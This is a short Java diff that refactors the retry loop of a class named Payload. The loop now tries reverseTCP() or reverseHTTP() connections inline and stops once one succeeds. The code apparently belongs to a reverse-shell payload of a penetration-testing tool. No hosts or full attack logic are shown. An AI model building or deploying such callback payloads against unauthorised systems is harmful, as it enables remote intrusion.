@@ -64,24 +64,21 @@ public class Payload {
         long retryDelay = TimeUnit.SECONDS.toMillis(retryWait);
 
         while (retryEnd > System.currentTimeMillis()) {
-            startReverseConn();
+            try {
+                if (URL.substring(4).trim().length() == 0) {
+                    reverseTCP();
+                } else {
+                    reverseHTTP();
+                }
+                return;
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
             try {
                 Thread.sleep(retryDelay);
             } catch (InterruptedException e) {
                 return;
             }
-        }
-    }
-
-    private static void startReverseConn() {
-        try {
-            if (URL.substring(4).trim().length() == 0) {
-                reverseTCP();
-            } else {
-                reverseHTTP();
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
         }
     }
 
